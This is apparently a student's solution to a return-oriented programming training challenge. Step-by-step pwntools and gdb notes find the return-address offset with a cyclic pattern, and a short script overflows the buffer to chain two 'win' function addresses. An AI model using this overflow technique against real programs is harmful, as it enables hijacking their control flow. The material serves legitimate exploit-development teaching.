"""
check pwn with: pwn checksec <bin_file_name>

Terminal 1:
import pwn
io = pwn.process("level2_teaching1")
#TODO: get <pid>

Terminal 2: 
gdb -p <pid>
p win_stage_1 #prints address of win_stage_1 function
p win_stage_2 #prints address of win_stage_2 function
c

Terminal 1:
io.send(pwn.cyclic(1000, n=8))

Terminal 2: 
#TODO: get return addr <retq>

Terminal 1: 
pwn.cyclic_find(<retq>, n=8) #prints starting position of return address

Run script below. Note where the numbers are from.
"""

import pwn

dis = 40
stage1 = 0x402599 # win_stage_1 address
stage2 = 0x4025cc # win_stage_2 address
x = b"a"*dis + pwn.p64(stage1) + pwn.p64(stage2)

io = pwn.process("/challenges/rop/level2_teaching1")
io.send(x)

print(io.readall().decode('latin-1'))